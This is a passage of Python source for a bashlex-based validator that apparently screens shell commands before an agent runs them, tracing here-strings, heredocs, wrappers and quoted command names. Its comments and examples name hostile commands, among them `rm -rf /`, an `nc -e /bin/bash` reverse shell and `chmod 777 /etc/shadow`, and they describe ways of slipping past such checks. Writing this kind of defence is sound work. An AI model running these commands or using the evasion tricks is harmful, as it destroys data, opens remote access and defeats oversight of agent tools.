    if cmd_name not in _MULTICALL_BINARIES:
        return cmd_name, args
    for i, arg in enumerate(args):
        if not arg.startswith("-"):
            return arg, args[i + 1 :]
    return cmd_name, args


def _command_nodes(node: Any) -> "list[Any]":
    """Every `command`-kind node reachable from `node`, in source order.

    Returns ALL commands in a group so a stdin consumer that is not the first command
    (`{ true; bash; }`, a while/for/if body) is still seen. Stops at each command without
    descending into its own parts (word-level substitutions are not group stdin consumers).
    """
    found: list[Any] = []

    def walk(n: Any) -> None:
        if not hasattr(n, "kind"):
            return
        if n.kind == "command":
            found.append(n)
            return
        for attr in ("list", "parts", "command"):
            child = getattr(n, attr, None)
            if isinstance(child, list):
                for item in child:
                    walk(item)
            elif child is not None:
                walk(child)

    walk(node)
    return found


def _first_command_node(node: Any) -> Optional[Any]:
    """Return the first `command`-kind node reachable from `node`, in source order, else None.

    Used to classify a subshell/group pipeline stage (`(bash)`, `{ bash; }`): the piped data lands
    on the FIRST command inside the group (its stdin sink). Inner *pipelines* within the group are
    handled separately by the recursive walk, so first-command is the right target here (#97) -
    unlike a here-string's shared fd, which any command in the group may read (`_command_nodes`).

    Expressed via `_command_nodes` so the two security-critical traversals share ONE walk skeleton:
    a future bashlex child-attr change cannot leave one of them silently under-scanning (LAB-2768).
    """
    return next(iter(_command_nodes(node)), None)


def _reads_stdin_as_program(cmd_name: str, args: list[str]) -> bool:
    """True if interpreter `cmd_name` would execute its STDIN as a program given `args`.

    Fail-CLOSED model (a security check must not guess flag arity): the interpreter is exempt
    (returns False) only when a program source is UNAMBIGUOUS —
      - an inline-code flag valid for this interpreter (-c / -e / -m / ...), separate or attached; or
      - a positional (non-dash) script token appearing BEFORE any option flag.
    Once an option flag is seen, a following non-dash token is treated as that flag's VALUE
    (NOT a script), so it cannot exempt — this closes the value-taking-flag bypass
    (`bash --rcfile X`, `python3 -W ignore`, `perl -I /tmp`, `node -r fs`, ...).
    Explicit stdin paths ('-', '/dev/stdin', ...) -> True. No unambiguous program -> True.
    """
    inline = _INLINE_CODE_FLAGS.get(cmd_name, frozenset())
    saw_option = False
    for arg in args:
        # Inline code (separate flag, or attached like -c'...') -> runs that program, not stdin.
        if arg in inline or (len(arg) > 2 and arg[0] == "-" and f"-{arg[1]}" in inline):
            return False
        # Explicit stdin designator -> reads stdin.
        if arg in _STDIN_PATHS:
            return True
        if not arg.startswith("-"):
            # A leading positional (before any option) is a script file -> runs it.
            # A non-dash token AFTER an option is that option's value, NOT a script -> ignore it.
            if not saw_option:
                return False
            continue
        saw_option = True
    return True


def _stdin_here_string(redirect_nodes: "list[Any]") -> Optional[str]:
    """Content of the here-string a command's stdin ends up holding, else None.

    The here-string content is the redirect's target word (`.output`); a fd-duplication redirect
    (`>&2`) carries an int there instead, so guard on `.word`. Redirections apply left to right and
    the last to touch stdin wins: a `<<<` with no fd (or fd 0) sets stdin; `3<<< X` fills fd 3, which
    a bare interpreter never reads (verified: `bash 3<<< "echo x"` prints nothing) - unless a later
    `<&3` duplicates it onto stdin (`bash 3<<< "echo x" <&3` prints x), so duplications of a
    here-string-bearing fd are followed. Taking the last `<<<` regardless of fd let a trailing
    `3<<< decoy` displace the real payload. A `< file` or heredoc on stdin is deliberately NOT
    modelled as displacing an earlier here-string: over-surfacing re-validates a payload that may
    not run (fails closed), under-surfacing misses one that does.
    """
    by_fd: dict[int, str] = {}
    for part in redirect_nodes:
        if getattr(part, "kind", None) != "redirect":
            continue
        fd = getattr(part, "input", None) or 0
        kind, target = getattr(part, "type", None), getattr(part, "output", None)
        if kind == "<<<" and target is not None and hasattr(target, "word"):
            by_fd[fd] = target.word
        elif kind == "<&" and isinstance(target, int) and target in by_fd:
            by_fd[fd] = by_fd[target]
    return by_fd.get(0)


def _command_words(node: Any) -> "list[str]":
    """Word tokens (command name + args) of a command node, skipping assignment/redirect prefixes."""
    words: list[str] = []
    for part in getattr(node, "parts", []):
        if getattr(part, "kind", None) in ("assignment", "redirect"):
            continue
        if hasattr(part, "word"):
            words.append(part.word)
    return words


def heredoc_owner(node: Any) -> Optional[str]:  # noqa: PLR0911 - guard clauses over nesting
    """What runs a command node's heredoc, basename only; None only when it has no command word.

    Built on `_command_words`, so an assignment prefix is skipped: `FOO=1 bash` runs `bash`.
    Taking the first part that merely HAS a `.word` read it as a command named `FOO=1`, and
    a shell behind any assignment was then treated as an inert heredoc consumer.

    A wrapper execs its command with its own stdin, so `env bash <<EOF` hands the body to bash;
    busybox and toybox are wrappers here too (`busybox sh`). The owner is the first shell among
    ALL the wrapper's operands (`timeout 5 sh`) - an over-read for `flock ./bash cat`, the
    fail-closed direction - else what `_scan_wrapper_operands` finds.

    Callers ask one question, "is the owner a shell", and the unquoted path reads None as "no".
    So an owner that is not a definite inert reader is `_DEFAULT_SHELL` (LAB-5180):
      - a head or wrapper command that `names_unresolved_program` (`$'bash'`, `${SHELL:-/bin/sh}`);
      - a `$SHELL`-exec wrapper with no command (`unshare -U`, `chroot /`, `sg GROUP`), or with an
        option its spec does not know;
      - `xargs` whose command is itself a wrapper, so a body line supplies the command
        (`xargs env`), and GNU `parallel` with no template or one that runs its line as code;
      - `.`/`source` of stdin or of a file this parser cannot name.
    """
    raw = _command_words(node)
    if not raw:
        return None
    if names_unresolved_program(raw[0]):
        return _DEFAULT_SHELL
    head = raw[0].split("/")[-1]
    if head in (".", "source"):
        return _DEFAULT_SHELL if _sources_stdin(raw[1:]) else head
    if not _is_wrapper(head):
        return head
    operands = expand_env_split_string(head, raw[1:])
    shell = next((word.split("/")[-1] for word in operands if word.split("/")[-1] in _HEREDOC_SHELL_COMMANDS), None)
    if shell is not None:
        return shell
    candidates, runs_code = _scan_wrapper_operands(head, operands)
    if runs_code:
        return _DEFAULT_SHELL
    if head == "xargs" and any(map(_is_wrapper, candidates)):
        return _DEFAULT_SHELL  # `xargs env`: a body line supplies the wrapped command
    return head


def shell_wrapping_functions(nodes: "list[Any]") -> "set[str]":
    """Names of functions defined in `nodes` whose body runs a shell on its own stdin.

    `f() { bash; }; f <<'EOF' … EOF` hands the heredoc to `f`'s stdin, and the `bash` inside `f`
    inherits it and runs it as code. Such a function's heredoc must be scanned as code, not
    trusted as inert stdin to an unknown command (LAB-5180). A body command whose `heredoc_owner`
    is a shell makes the function shell-wrapping.

    Wrapping is TRANSITIVE and computed to a fixed point: `g() { bash; }; f() { g; }; f` wraps a
    shell through `g`, so calling a known wrapping function counts as wrapping (declaration order
    is irrelevant - the fixed point covers a forward call). Bounded: each pass can only add names,
    the name set is finite, so it converges (LAB-5180).
    """
    # Collect each function's name and the command names its body runs, once.
    bodies: dict[str, list[str]] = {}
    direct: set[str] = set()

    def walk(n: Any) -> None:
        if getattr(n, "kind", None) == "function":
            name = getattr(getattr(n, "name", None), "word", None)
            body = getattr(n, "body", None)
            if name and body is not None:
                called: list[str] = []
                for cmd in _command_nodes(body):
                    if heredoc_owner(cmd) in _HEREDOC_SHELL_COMMANDS:
                        direct.add(name)
                    words = _command_words(cmd)
                    if words:
                        called.append(words[0].split("/")[-1])
                bodies[name] = called
        for value in vars(n).values():
            for child in value if isinstance(value, list) else (value,):
                if hasattr(child, "kind"):
                    walk(child)

    for n in nodes:
        walk(n)

    result = set(direct)
    changed = True
    while changed:
        changed = False
        for name, called in bodies.items():
            if name not in result and any(c in result for c in called):
                result.add(name)
                changed = True
    return result


def command_position_substitution(command_node: Any) -> "Optional[Any]":
    """The command substitution in COMMAND POSITION of one command node, else None.

    `$(cat <<'EOF' … )` in command position runs what cat prints, so the heredoc body is code;
    `x=$(cat <<'EOF' … )` (assignment) and `git commit -m "$(cat <<'EOF' … )"` (argument) are
    data (LAB-5180). A substitution is in command position when it is the whole first word of the
    command - not an assignment prefix, not a later argument, not a fragment glued to text.
    """
    for part in getattr(command_node, "parts", []):
        pk = getattr(part, "kind", None)
        if pk in ("assignment", "redirect"):
            continue
        if pk == "word":
            wp = getattr(part, "parts", [])
            if len(wp) == 1 and getattr(wp[0], "kind", None) == "commandsubstitution":
                return wp[0]
        return None  # only the first word is the command
    return None


def _classify_sink(sink: Any, here_string: str) -> "Optional[tuple[str, str]]":
    """Return (interpreter, here_string) if command node `sink` runs its stdin as a program.

    Two shapes, mirroring the `-c` path:
    - direct: the sink is a stdin-executing interpreter reading stdin as a program. `bash -c X <<< Y`
      runs X (Y is inert data), `bash script.sh <<< Y` runs the script, `cat`/`grep` read stdin but
      never execute it - all correctly excluded by `_reads_stdin_as_program`.
    - wrapped: `timeout 5 bash <<< Y`, `env FOO=1 bash <<< Y`. The wrapper execs a shell that
      inherits the wrapper's stdin (verified against timeout/env/stdbuf/nice). Mirrors the wrapper
      scan in `_shell_delegated_payloads`: EVERY operand position, not the first interpreter name,
      because a wrapper's own operand can share one - `flock ./bash sh <<< Y` locks a file named
      bash and runs sh, `strace -o bash sh <<< Y` traces into a file named bash (both run Y in sh,
      verified). Stopping at the decoy read `sh` as its script operand and surfaced nothing.

    `_reads_stdin_as_program` only decides flag arity; membership in STDIN_EXEC_INTERPRETERS is the
    caller's to check, exactly as the pipe-to-shell walk does at check_pipeline.
    """
    words = _command_words(sink)
    if not words:
        return None

    # Basename the resolved applet too: `busybox /bin/sh` resolves to `/bin/sh`, which is the
    # same stdin-exec shell as `busybox sh`. Without this the here-string drifted from its
    # heredoc twin - `busybox /bin/sh <<< X` scored HIGH while `busybox sh <<< X` was BLOCKED
    # (LAB-5180).
    name, args = _resolve_multicall(words[0].split("/")[-1], words[1:])
    name = name.split("/")[-1]
    if name in STDIN_EXEC_INTERPRETERS and _reads_stdin_as_program(name, args):
        return (name, here_string)

    if name in WRAPPER_COMMANDS:
        for at, arg in enumerate(args):
            interpreter = arg.split("/")[-1]
            if interpreter in STDIN_EXEC_INTERPRETERS and _reads_stdin_as_program(interpreter, args[at + 1 :]):
                return (interpreter, here_string)
    return None


def _here_string_program(node: Any) -> "Optional[tuple[str, str]]":
    """Return (interpreter, here-string) if `node` runs its `<<<` here-string as a program.

    A `<<<` redirect feeds its word to a command's stdin; a bare interpreter runs that stdin as a
    program. The redirect attaches in two places:

    - on a command node (`bash <<< "rm -rf /"`): the command IS the stdin sink.
    - on a compound/group/loop node (`( bash ) <<< X`, `{ true; bash; } <<< X`, `while :; do bash;
      done <<< X`): the here-string feeds the GROUP's stdin, which bashlex hangs on `.redirects`.
      ANY bare interpreter in the group can consume it - an earlier command that does not read stdin
      (`true`, `echo`) simply leaves it for the next command (all verified against real bash). So we
      must check every command in the group, not just the first: checking only `_first_command_node`
      missed `{ true; bash; } <<< "rm -rf /"` (CodeRabbit CWE-78 Critical on #151). Over-approximate
      to every command - the safe direction, since surfacing re-validates the payload: a benign
      here-string still passes, only a dangerous one blocks. (A rare over-block, e.g. `{ cat; bash;
      } <<< X` where `cat` actually consumes the here-string, is acceptable and fails closed.)

    `_reads_stdin_as_program` only decides flag arity; membership in STDIN_EXEC_INTERPRETERS is the
    caller's to check, exactly as the pipe-to-shell walk does at check_pipeline.
    """
    kind = getattr(node, "kind", None)
    if kind == "command":
        here_string = _stdin_here_string(getattr(node, "parts", []))
        if here_string is None:
            return None
        return _classify_sink(node, here_string)

    if kind == "compound":
        here_string = _stdin_here_string(getattr(node, "redirects", []))
        if here_string is None:
            return None
        for sink in _command_nodes(node):
            found = _classify_sink(sink, here_string)
            if found is not None:
                return found
    return None


class CommandSegment(NamedTuple):
    """One independently-validated command segment, wholly derived from ONE parse.

    The two range lists have DIFFERENT shapes - `(start, stop)` for literals,
    `(start, stop, is_shell)` for heredocs - and both feed suppression. Naming
    them is what stops one being passed where the other belongs, which would
    misalign suppression silently rather than raise.
    """

    text: str
    string_literals: list[tuple[int, int]]
    heredoc_ranges: list[tuple[int, int, bool]]
    # The segment's own node in the PARENT AST. Its word spans index the whole
    # command, not `text` - see validator._match_original_and_reconstructed's
    # `quote_source`, which is the reason this is handed back at all.
    node: Any


class BashCommandParser:
    """Parse bash commands using bashlex AST analysis.

    This parser is security-critical. It uses bashlex to parse commands into
    an Abstract Syntax Tree (AST), enabling accurate detection of dangerous
    patterns that regex cannot reliably catch.

    SECURITY: This class REQUIRES bashlex. It will not fall back to regex
    parsing, as regex-based command parsing has well-known bypass vulnerabilities.

    Example:
        >>> parser = BashCommandParser()
        >>> ast = parser.parse("git log | grep 'pattern'")
        >>> commands = parser.extract_commands(ast)
        >>> print(commands)  # ['git', 'grep']
    """

    def __init__(self):
        """Initialize BashCommandParser."""
        pass

    def _get_command_name(self, node) -> Optional[str]:
        """Extract the command name from a command node.

        SECURITY: Correctly handles prefixes that appear before the command:
        - Assignment nodes: VAR=value exec bash → returns 'exec'
        - Redirect nodes: 2>&1 exec bash → returns 'exec'
        - Path handling: /usr/bin/exec → returns 'exec'

        Args:
            node: A bashlex AST node

        Returns:
            The command name (basename), or None if not a command node

        Example:
            >>> # VAR=x exec bash → 'exec' (assignment skipped)
            >>> # /usr/bin/curl → 'curl' (path stripped)
        """
        if not hasattr(node, "kind") or node.kind != "command":
            return None
        if not hasattr(node, "parts"):
            return None

        for part in node.parts:
            # Skip assignment nodes (VAR=value prefixes)
            if hasattr(part, "kind") and part.kind == "assignment":
                continue
            # Skip redirects
            if hasattr(part, "kind") and part.kind == "redirect":
                continue
            # Found a word node - this is the command name
            if hasattr(part, "word"):
                cmd = part.word.split("/")[-1]
                return cmd if cmd else None

        return None

    def parse(self, command: str) -> list[Any]:
        """Parse command into bashlex AST.

        Args:
            command: Bash command string to parse

        Returns:
            List of bashlex AST nodes

        Raises:
            ValueError: If command is empty or whitespace-only
            ParseError: If bashlex fails to parse the command syntax

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("echo hello")
            >>> ast  # [<bashlex.ast.node object>]
        """
        # Input validation
        if not command:
            raise ValueError("Command cannot be empty")
        if not command.strip():
            raise ValueError("Command cannot be whitespace-only")

        try:
            return bashlex.parse(command)
        except bashlex.errors.ParsingError as e:
            # Preserve original bashlex error for debugging
            raise ParseError(
                f"Failed to parse bash command: {command!r}",
                original_error=e,
            )
        except Exception as e:
            # Catch any other unexpected bashlex errors
            logger.error(f"Unexpected error parsing command: {e}")
            raise ParseError(
                f"Unexpected parsing error for command: {command!r}",
                original_error=e,
            )

    def extract_commands(self, ast_nodes: list[Any]) -> list[str]:
        """Extract all command names from AST.

        Traverses the AST and extracts the first word of each command node,
        which is typically the command name (e.g., 'git', 'rm', 'curl').

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of command names extracted from the AST

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("git log | grep pattern")
            >>> parser.extract_commands(ast)
            ['git', 'grep']
        """
        commands = []

        def visit(node):
            """Recursively visit AST nodes to extract commands."""
            if hasattr(node, "kind"):
                # Command nodes contain the actual command
                if node.kind == "command" and hasattr(node, "parts") and node.parts:
                    # First part is typically the command name
                    for part in node.parts:
                        if hasattr(part, "word"):
                            commands.append(part.word)
                            break  # Only take first word (command name)

                # Recursively visit child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return commands

    def extract_commands_with_args(self, ast_nodes: list[Any]) -> list[tuple[str, list[str]]]:
        """Extract all command names with their arguments from AST.

        SECURITY CRITICAL: Returns command name and ALL arguments as extracted
        by bashlex AST (quotes stripped). This enables pure AST-based validation
        of dangerous flag combinations without regex pattern matching.

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of (command_name, [args]) tuples where args includes all
            arguments with quotes stripped by bashlex.

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse('"nc" -e /bin/bash host 4444')
            >>> parser.extract_commands_with_args(ast)
            [('nc', ['-e', '/bin/bash', 'host', '4444'])]
        """
        results: list[tuple[str, list[str]]] = []

        def visit(node):
            """Recursively visit AST nodes to extract commands with args."""
            if hasattr(node, "kind"):
                # Command nodes contain the actual command and arguments
                if node.kind == "command" and hasattr(node, "parts") and node.parts:
                    words = []
                    for part in node.parts:
                        # Skip assignment nodes (VAR=value prefixes)
                        if hasattr(part, "kind") and part.kind == "assignment":
                            continue
                        # Skip redirects (2>&1, >, <, etc.)
                        if hasattr(part, "kind") and part.kind == "redirect":
                            continue
                        if hasattr(part, "word"):
                            words.append(part.word)
                    if words:
                        # First word is command, rest are arguments
                        results.append((words[0], words[1:]))

                # Recursively visit child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return results

    def extract_stdin_program_redirects(self, ast_nodes: list[Any]) -> list[tuple[str, str]]:
        """Extract here-string (`<<<`) contents a command executes as a program.

        SECURITY CRITICAL (LAB-2768): `bash <<< "rm -rf /"` feeds the here-string to bash's
        stdin, and a bare shell runs its stdin as a program - the same "argument is code, not
        data" sink as `bash -c PROG`, but the here-string hangs off a *redirect* node that
        `extract_commands_with_args` skips. So `_shell_delegated_payloads` sees `('bash', [])`,
        no payload, no recursion, and the delegated `rm -rf /` degrades to HIGH (allowed by the
        permissive preset).

        Returns (command_basename, here_string_text) for each command whose stdin - supplied by
        a `<<<` redirect - it executes as a program. Gated by `_reads_stdin_as_program` (the same
        predicate that makes pipe-to-shell dangerous), so a here-string that is NOT the program is
        never surfaced: `bash -c X <<< Y` (bash runs X; Y is inert stdin data), `bash script.sh
        <<< Y` (the script is the program), and `cat <<< text` (cat is not an interpreter). The
        caller decides which interpreters' payloads are re-validated as bash - a Python here-string
        (`python3 <<< "import os"`) is real stdin-as-program but nonsense to re-check as bash.
        """
        results: list[tuple[str, str]] = []

        def visit(node):
            if not hasattr(node, "kind"):
                return
            # `<<<` rides a command node's `.parts` (`bash <<< X`) or a compound node's `.redirects`
            # (`( bash ) <<< X`); _here_string_program handles both and finds the stdin sink.
            if node.kind in ("command", "compound"):
                found = _here_string_program(node)
                if found is not None:
                    results.append(found)
            for attr in ["parts", "command", "list", "pipe", "compound"]:
                child = getattr(node, attr, None)
                if isinstance(child, list):
                    for item in child:
                        visit(item)
                elif child:
                    visit(child)

        for node in ast_nodes or []:
            visit(node)

        return results

    @staticmethod
    def _close_heredocs(segment: str, node: Any) -> str:
        """Re-attach this command's heredocs so the segment parses on its own.

        bashlex hangs a heredoc body off the redirect node, PAST the command's
        span, so the bare slice ends at a `<<EOF` whose body never arrives. It
        then fails to re-parse, and a segment with no AST loses both literal
        suppression and the quote-stripped pass - which is how
        `echo hi && "chmod" 777 /etc/shadow <<EOF` scored SAFE.

        Only a shell's body comes back with it. `cat`'s body is inert text that
        the rule patterns would scan for nothing, and they backtrack over it:
        an everyday `cat <<EOF > file` with a 1000-line body cost seconds on a
        hook that runs before every bash call. `bash`'s body is source code,
        and dropping it would let `bash <<EOF | tee log` hide an `rm -rf /`.

        The terminator is always bashlex's own delimiter word, stripped exactly
        as the slice was, so a CRLF opener cannot desync from its terminator and
        fail closed on a legitimate command.
        """
        executes_body = heredoc_owner(node) in _HEREDOC_SHELL_COMMANDS

        for part in node.parts:
            heredoc = getattr(part, "heredoc", None)
            if heredoc is None:
                continue
            # bashlex's value is the body followed by its terminator line.
            body, _, _ = heredoc.value.rpartition("\n")
            segment += f"\n{body if executes_body else ''}\n{part.output.word.strip()}"

        return segment

    def _segment_nodes(self, ast_nodes: list[Any]) -> list[Any]:
        """Collect the AST nodes that each form one independently-validated segment."""
        nodes: list[Any] = []

        def visit(node):  # noqa: PLR0912 - AST traversal requires multiple branches
            """Recursively visit AST nodes to collect command nodes."""
            if hasattr(node, "kind"):
                # Command nodes contain individual commands
                if node.kind == "command" and hasattr(node, "pos"):
                    nodes.append(node)
                    return  # Don't recurse into command parts

                # Pipeline nodes - visit each command in the pipeline
                if node.kind == "pipeline" and hasattr(node, "parts"):
                    for part in node.parts:
                        if hasattr(part, "kind") and part.kind != "pipe":
                            visit(part)
                    return

                # List nodes (;, &&, ||) - visit each command
                if node.kind == "list" and hasattr(node, "parts"):
                    for part in node.parts:
                        if hasattr(part, "kind") and part.kind not in ("operator",):
                            visit(part)
                    return

                # Compound commands (if, for, while, etc.) - recurse into body
                if node.kind == "compound" and hasattr(node, "list"):
                    for item in node.list if isinstance(node.list, list) else [node.list]:
                        visit(item)
                    return

                # Recursively visit other child nodes
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return nodes

    @staticmethod
    def _rebase(ranges: list[tuple], base: int, end: int) -> list[tuple]:
        """Move offsets from the whole command onto one segment, dropping any outside it.

        Containment is not a formality, and it does different work per caller.

        For string literals it is a guard: a literal outside the span has no
        segment-relative expression, and dropping one costs only a false-positive
        suppression, never a missed match.

        For heredoc ranges it is the LIVE case, and both outcomes are load-bearing.
        A heredoc nested in a substitution (`diff <(cat <<EOF ... EOF)`) sits INLINE
        in the slice - _close_heredocs only ever reaches a command's own redirects,
        so nothing else suppresses it, and `cat` merely emits that text. It is
        inside the span, so it rebases and keeps suppressing. The segment's OWN
        body sits PAST the span; _close_heredocs re-appends it at an offset this
        slice cannot describe, so it is dropped - correct twice over, because the
        only body it ever appends is a shell's, and a shell's body is code that
        must stay matchable.
        """
        return [(start - base, stop - base, *rest) for start, stop, *rest in ranges if start >= base and stop <= end]

    def _locate_segment(self, command: str, node: Any) -> Optional[tuple[str, int]]:
        """Return (segment text, its start offset in `command`), or None if unusable.

        The offset is where the STRIPPED text begins, which is what makes
        segment-relative positions derivable without re-parsing the segment.
        """
        start, end = node.pos
        if start >= len(command) or end > len(command):
            # Dropping a segment means nothing validates it, which is the
            # fail-OPEN direction - so it must not happen silently.
            logger.warning("Segment span (%d, %d) outside command of length %d; segment not validated", start, end, len(command))
            return None
        raw = command[start:end]
        text = raw.strip()
        # An escaped trailing blank (`echo hi \ ; ls`) is a one-blank argument
        # and the strip just ate it. Callers re-parse the segment, and a
        # dangling `echo hi \` parses nowhere: the main loop loses its quote
        # context, the heredoc fallback denies it outright. Give it back — a
        # space either way, since `\<tab>` is the same one-blank argument and
        # the lengths match. An even run of backslashes is a literal argument
        # and needs nothing.
        # Done here, the one place the slice is taken, so every caller of
        # extract_command_segments{,_with_literals} gets it. Sound only because
        # `node.pos` already spans the blank: that is what keeps `base +
        # len(text)` on the node end, which extract_command_segments_with_literals
        # uses to bound its rebased literal ranges. Restoring a character the
        # span does NOT cover would widen that bound and keep a suppression
        # range it should have dropped.
        if (len(text) - len(text.rstrip("\\"))) % 2:
            text += " "
        if not text:
            logger.warning("Segment span (%d, %d) is blank after stripping; segment not validated", start, end)
            return None
        return text, start + (len(raw) - len(raw.lstrip()))

    def extract_command_segments(self, command: str, ast_nodes: list[Any]) -> list[str]:
        """Extract full command segments from pipelines and command lists.

        SECURITY CRITICAL: Returns the full text of each command segment so
        each can be validated independently. Prevents bypass via piping/chaining
        dangerous commands after whitelisted ones.

        Args:
            command: Original command string
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            List of command segment strings extracted from the AST

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("ls | rm -rf / && echo done")
            >>> parser.extract_command_segments("ls | rm -rf / && echo done", ast)
            ['ls', 'rm -rf /', 'echo done']
        """
        return [segment.text for segment in self.extract_command_segments_with_literals(command, ast_nodes)]

    def extract_command_segments_with_literals(self, command: str, ast_nodes: list[Any]) -> list[CommandSegment]:
        """Segments, their quoted-string ranges, and their own AST node — from ONE parse.

        PERF/SECURITY: the segment loop in `validate_command` used to re-parse
        every segment — for its string-literal ranges, and since LAB-1732 for the
        quote-stripped reconstructed pass too. That is N+1 parses per command,
        which under the native tier (spec §3.2) is N+1 subprocess spawns on a hook
        that runs before every bash call. A segment is a slice of `command`, so its
        words already sit in the parent AST: rebase the offsets, and hand the
        segment's own node back so the reconstructed pass can read that segment's
        quoting straight out of `command` (see
        validator._match_original_and_reconstructed). Deriving rather than
        re-parsing also removes the failure mode the re-parse had to fail closed
        on — a segment that would not parse standalone no longer exists.

        Args:
            command: Original command string
            ast_nodes: List of AST nodes from parse() of the WHOLE command

        Returns:
            List of CommandSegment - text, its string-literal ranges, its heredoc
            ranges, and its node - every field relative to `text` except the node.
            Both range lists go through _rebase, which is where the rule for what
            a segment may and may not suppress lives. `text` carries its heredoc
            back (_close_heredocs); that blob is appended AFTER the ranges are
            rebased, at the end of the text, so it cannot shift them.
        """
        results: list[CommandSegment] = []
        for node in self._segment_nodes(ast_nodes):
            located = self._locate_segment(command, node)
            if located is None:
                continue
            text, base = located
            end = base + len(text)
            results.append(
                CommandSegment(
                    text=self._close_heredocs(text, node),
                    string_literals=self._rebase(self.extract_string_literals(command, [node]), base, end),
                    heredoc_ranges=self._rebase(self.extract_heredoc_ranges(command, [node]), base, end),
                    node=node,
                )
            )
        return results

    def _collect_words(self, ast_nodes: list[Any]) -> list[tuple[str, Optional[tuple]]]:
        """Collect the word parts that make up the reconstructed command.

        Returns:
            List of (word_text, original_span) tuples in reconstruction order.
            original_span is the node's (start, end) offsets in the source
            command, or None when the node carries no position.
        """
        words: list[tuple[str, Optional[tuple]]] = []

        def visit(node):
            """Recursively visit AST nodes to extract words."""
            if hasattr(node, "kind"):
                # Command nodes - extract their word parts
                if node.kind == "command" and hasattr(node, "parts"):
                    for part in node.parts:
                        if hasattr(part, "word"):
                            words.append((part.word, getattr(part, "pos", None)))
                    return  # Don't recurse further into this command

                # Recursively visit child nodes for other structures
                for attr in ["parts", "command", "list", "pipe", "compound"]:
                    if hasattr(node, attr):
                        child = getattr(node, attr)
                        if isinstance(child, list):
                            for item in child:
                                visit(item)
                        elif child:
                            visit(child)

        for node in ast_nodes or []:
            visit(node)

        return words

    def reconstruct_command(self, ast_nodes: list[Any]) -> str:
        """Reconstruct command from AST word nodes.

        No production caller - the live validation pass uses
        reconstruct_command_with_suppression_ranges, which produces the same
        string plus the ranges the rule engine needs. Kept for the
        native-parser differential oracle; harden the other one.

        Args:
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            Reconstructed command string with escapes resolved

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse("rm\\\\ -rf\\\\ /")
            >>> parser.reconstruct_command(ast)
            'rm -rf /'
        """
        return " ".join(word for word, _ in self._collect_words(ast_nodes))

    def reconstruct_command_with_suppression_ranges(self, command: str, ast_nodes: list[Any]) -> tuple[str, list[tuple]]:
        """Reconstruct the command AND rebase its suppression ranges onto it.

        SECURITY CRITICAL (LAB-1732): the reconstructed pass is the only defence
        that catches a dangerous command whose name is quoted - bash runs
        `"chmod" 777 /etc/shadow` exactly as `chmod 777 /etc/shadow`. That pass
        used to be skipped whenever the command held any quoted token at all,
        because reconstruction strips quote characters and so invalidates every
        offset computed against the original string. Skipping traded a
        false-positive class for an under-block class, the wrong direction for a
        fail-closed validator. Rebasing keeps both properties: the pass always
        runs, and matches living wholly inside quoted data stay suppressed.

        Rebasing works because suppression needs a match to sit ENTIRELY inside
        one range (RuleEngine._is_in_string_literal). Which words earn a range
        is decided by _quoting_is_load_bearing - read that first.

        Args:
            command: Original command string (needed for quote detection)
            ast_nodes: List of bashlex AST nodes from parse()

        Returns:
            (reconstructed_command, suppression_ranges).

            NOT the same shape as extract_string_literals, though both feed the
            same `string_literals=` argument, so passing one where the other
            belongs misaligns suppression silently. These offsets index the
            RECONSTRUCTED string, cover the whole word plus its joining space,
            and are omitted entirely for words whose quotes do no work.

        Example:
            >>> parser = BashCommandParser()
            >>> ast = parser.parse('echo "rm -rf /"')
            >>> parser.reconstruct_command_with_suppression_ranges('echo "rm -rf /"', ast)
            ('echo rm -rf /', [(5, 14)])
        """
        words = self._collect_words(ast_nodes)
        ranges = []
        offset = 0

        for word, span in words:
            if span is not None and self._quoting_is_load_bearing(command, word, span):
                # Absorb the following joining space. In the source that offset
                # held the closing quote, a character no rule pattern can cross;
                # reconstruction turns it into whitespace, which patterns ending
                # in `(\s|$)` will happily consume - without this the match ends
                # one character past the range and escapes suppression. Adding it
                # unconditionally is safe: for the final word the range then ends
                # at len(reconstructed) + 1, which no match end can reach.
                ranges.append((offset, offset + len(word) + 1))
            offset += len(word) + 1  # +1 for the joining space

        return " ".join(word for word, _ in words), ranges

    def _quoting_is_load_bearing(self, command: str, word: str, span: tuple) -> bool:
        """Whether a word's quotes do real work, rather than just hiding it.

        SECURITY CRITICAL: this is the whole of LAB-1732. Quotes suppress a rule
        match only when they are what makes the text a single inert argument -
        `echo "rm -rf /"` passes one word to echo, and without the quotes it
        would not. A quoted BARE TOKEN is different: bash runs `"mkfs.ext4"`
        exactly as `mkfs.ext4`, so the quotes change nothing about execution and
        exist only to keep the name out of the reconstructed string. Suppressing
        there is the bypass, because a name-only pattern (`\bmkfs\b`) sits
        entirely inside that one word and so is swallowed whole.

        Asking "is the quoting load-bearing" rather than "is this the command
        name" is what covers the exec-wrapper forms - `timeout 5 "mkfs.ext4" …`,
        `env FOO=1 "mkfs.ext4" …`, `nice/command/nohup/setsid "mkfs.ext4" …` -
        where bash executes a word that is NOT in command-name position.
        """
        if not word or not self._is_quoted_span(command, span):
            return False
        # Shell-significant characters are the ones quoting actually protects.
        return any(char in word for char in " \t\n;|&<>()$`*?[]#~!\\'\"")

    @staticmethod
    def _is_quoted_span(command: str, span: tuple) -> bool:
        """Whether the source text at ``span`` is wrapped in matching quotes.

        Shared with extract_string_literals so both derive "is this token a
        quoted literal" from one rule.
        """
        start, end = span
        if start >= len(command) or end > len(command) or end - start < 2:
